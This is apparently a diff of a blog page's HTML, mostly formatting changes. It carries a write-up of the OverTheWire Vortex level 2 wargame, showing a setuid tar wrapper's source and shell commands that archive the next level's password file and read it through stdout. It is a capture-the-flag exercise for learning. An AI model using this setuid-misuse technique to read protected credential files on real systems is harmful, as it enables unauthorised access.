@@ -1724,7 +1724,7 @@ blog.dornea.nu            </a>
                 <p>Solution for <a href="http://www.overthewire.org/wargames/vortex/vortex2.shtml">level2</a>:</p>
 <p>Here is the code:</p>
 <div>
-  <pre class="lang:default decode:true ">#include &lt;stdlib.h&gt;
+<pre class="lang:default decode:true ">#include &lt;stdlib.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;sys/types.h&gt;
 
@@ -1733,26 +1733,22 @@ int main(int argc, char **argv)
         char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
         execv(args[0], args);
 }</pre>
-
-  <p>
+<p>
     Â <!--more-->
-  </p>
+</p>
 </div>
-
 <p><strong>$$</strong> expands to the process ID of the shell.</p>
 <pre class="lang:default decode:true">$ echo $$
 24489</pre>
-
-<p>Let&#8217;s make some observations:</p>
+<p>Let’s make some observations:</p>
 <div>
-  <div dir="ltr" lang="en">
-    <pre class="lang:default decode:true ">vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
+<div dir="ltr" lang="en">
+<pre class="lang:default decode:true ">vortex2@melissa:~$ ls -l /etc/vortex_pass/vortex3 
 -r-------- 1 vortex3 vortex3 10 2011-11-14 18:15 /etc/vortex_pass/vortex3
 vortex2@melissa:~$ ls -l /vortex/vortex2
 -r-sr-x--- 1 vortex3 vortex2 7134 2011-11-13 23:07 /vortex/vortex2</pre>
-  </div>
 </div>
-
+</div>
 <p>The password file is owned by <strong>vortex3</strong>. And the binary <strong>/vortex/vortex3</strong> is allowed to read this file. So we are allowed to tar this file using the binary. The binary itself expects 3 arguments. There we go:</p>
 <pre class="lang:default decode:true">vortex2@melissa:/etc/vortex_pass$ /vortex/vortex2 vortex3 vortex3 vortex3 
 /bin/tar: U\211\345WVS\350Z: Cannot stat: No such file or directory
@@ -1762,12 +1758,10 @@ vortex2@melissa:/etc/vortex_pass$ ls -l '/tmp/ownership.$$.tar'
 vortex2@melissa:/etc/vortex_pass$ cd /tmp/****
 vortex2@melissa:/tmp/****$ cp '/tmp/ownership.$$.tar' .
 cp: cannot create regular file `./ownership.$$.tar': Permission denied</pre>
-
 <p>Obviously we are not allowed to copy/untar the file. What about STDOUT?</p>
 <pre class="lang:default decode:true">$ tar xf '/tmp/ownership.$$.tar' -O
 *******</pre>
-
-<p>Password revealed. Next level! <img src="http://dornea.nu/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /></p>
+<p>Password revealed. Next level! <img alt=":-)" class="wp-smiley img-responsive" src="http://dornea.nu/wp-includes/images/smilies/icon_smile.gif"/></p>
             </div>
             <!-- /.entry-content -->
 <section class="well" id="related-posts">
@@ -1775,9 +1769,9 @@ cp: cannot create regular file `./ownership.$$.tar': Permission denied</pre>
     <ul>
         <li><a href="http://blog.dornea.nu/2013/05/02/overthewire-vortex-level1">OverTheWire: Vortex Level1</a></li>
         <li><a href="http://blog.dornea.nu/2014/10/29/howto-ios-apps-static-analysis">HowTo: iOS Apps - Static analysis</a></li>
-        <li><a href="http://blog.dornea.nu/2013/08/02/howto-automate-burp-using-burp-extender-api">HowTo: Automate Burp using Burp Extender API</a></li>
-        <li><a href="http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions">Googles XSS Game - Solutions</a></li>
         <li><a href="http://blog.dornea.nu/2013/05/06/hacking-altoro-mutual">Hacking Altoro Mutual</a></li>
+        <li><a href="http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions">Googles XSS Game - Solutions</a></li>
+        <li><a href="http://blog.dornea.nu/2013/08/02/howto-automate-burp-using-burp-extender-api">HowTo: Automate Burp using Burp Extender API</a></li>
     </ul>
 </section>
     <hr />
